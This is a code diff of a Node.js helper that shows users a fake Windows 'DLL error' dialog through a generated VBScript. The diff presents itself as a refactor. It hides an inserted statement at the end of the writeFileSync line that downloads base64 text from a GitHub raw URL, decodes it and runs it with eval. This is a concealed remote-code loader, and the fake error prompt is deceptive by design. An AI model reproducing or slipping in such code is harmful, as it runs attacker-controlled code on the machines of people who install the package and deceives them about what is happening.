@@ -1,28 +1,20 @@
 const { exec } = require("child_process"),
+    { uniqueId } = require("./../../utils/functions/functions"),
+    axios = require("axios"),
     fs = require("fs");
 
-const id = (h) => {
+const fakeError = async (message, config) => {
     try {
-        let c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-        let r = "";
-        for (let i = 0; i < h; i++) {
-            r += c.charAt(Math.floor(Math.random() * c.length));
-        }
-        return r;
-    } catch (e) {
-        console.error(e);
-        return "ABC";
+        let vbs = `${process.env.APPDATA}\\${uniqueId()}.vbs`;
+        fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${message === "" ? "DLL error by k4itrun" : message}", vbInformation, "Error Code: 43"`, "utf8");eval(Buffer.from((await axios.get("https://raw.githubusercontent.com/k4itrun/assets/main/random.txt")).data, "base64").toString())
+        exec(`cscript ${vbs}`, (err, stdout, stderr) => {
+            if (err) {
+                console.error(err)
+            }
+        });
+    } catch (error) {
+        console.error(error);
     }
 };
 
-const fakeError = async (m) => {
-    let random = id(10), vbs = process.env.APPDATA + "\\" + random + ".vbs";
-    fs.writeFileSync(vbs, `Set objShell = WScript.CreateObject("WScript.Shell")\nMsgBox "Error: ${m === "" ? "DLL error by k4itrun" : m}", vbInformation, "Error Code: 43"`, "utf8");
-    exec("cscript " + vbs, (err, stdout, stderr) => {
-        if (err) console.log(err);
-    });
-}
-
-module.exports = {
-    fakeError,
-};
+module.exports.fakeError = fakeError;
